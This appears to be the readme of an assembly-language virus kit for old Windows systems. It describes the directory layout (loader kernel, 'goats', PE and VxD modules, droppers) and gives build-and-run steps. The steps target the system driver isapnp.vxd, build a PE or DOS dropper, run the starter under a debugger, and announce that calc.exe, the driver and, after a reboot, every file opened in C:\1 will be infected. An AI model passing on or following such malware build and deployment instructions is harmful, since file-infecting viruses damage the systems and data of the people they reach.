this should be in directory E:\0ASM\PROJECT

and this is meaning of subdirectories:
  bat
    bats for compiling modules
  bin
    some special binaries (creating module, mounting, ...)
  includes
    global includes
  loader
    kernel (manipulating modules) with goats and starters
  modules\compiled
    code of all compiled modules
  modules\compiled\modules.bat
    bat mounting modules to loader (kernel)
  modules\targets
    processed target
  modules\support
    supporting modules - survive under various platforms (PE, VxD, DPMI)
  modules\other
    libs

if you want to test this follow these steps:
  1) in windows\system backup isapnp.vxd to isapnp.org (this is our primary target)  
  2) run !.bat in all subdirectories in modules - i hope no error will occur
  3) go to loader and run pe.bat (if you want pe dropper) or dos4.bat
  4) run starter.exe (under SoftIce\W environment because there may be some
     breakpoints in code I forgot ; or remove breakpoints in sources ...)
  5) enjoy - calc.exe in loader will be infected and isapnp.vxd too. Just reboot
     and all opened files in C:\1 will be infected.

that's all
